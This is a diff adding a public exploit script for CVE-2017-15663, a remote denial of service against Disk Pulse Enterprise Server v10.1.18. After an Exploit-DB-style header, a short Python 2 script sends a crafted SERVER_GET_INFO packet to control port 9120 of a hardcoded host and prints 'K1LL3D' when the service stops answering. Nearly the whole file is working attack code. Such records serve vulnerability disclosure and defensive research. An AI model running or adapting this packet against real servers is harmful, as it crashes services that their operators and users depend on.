@@ -1,0 +1,47 @@
+# Exploit Title: Disk Pulse Enterprise Server v10.1.18 - DOS,
+# Date: 2017-10-20
+# Exploit Author: Ahmad Mahfouz
+# Software Link: http://www.diskpulse.com/setups/diskpulsesrv_setup_v10.1.18.exe
+# Version: v10.1.18
+# Category; Windows Remote DOS
+# CVE: CVE-2017-15663
+# Author Twitter: @eln1x
+# Description In Disk Pulse Enterprise Server v10.1.18, the Control Protocol suffers from a denial of service. The attack vector is a crafted SERVER_GET_INFO packet sent to control port 9120.
+
+ 
+
+ 
+
+import socket
+target = "192.168.72.231"
+port = 9120
+s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((target,port))
+
+packet = "\x75\x19\xba\xab\x03"
+packet +="\x00\x00\x00\x01\x00\x00\x00\x1a"
+packet += "\x00"
+packet += "\x3e" #evil
+packet += "\x00"
+packet += "\x20"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00\x00\x00\x00"
+packet += "SERVER_GET_INFO"
+packet += "\x02\x32\x01"
+packet += "Data"
+packet += "\x01\x30\x01\x00"
+packet += "\x04\x02\x74"
+packet += "\x18\x18\x00"
+
+s.send(packet)
+
+try:
+
+         data = s.recv(100)
+         print data
+
+except:
+
+         print "K1LL3D"
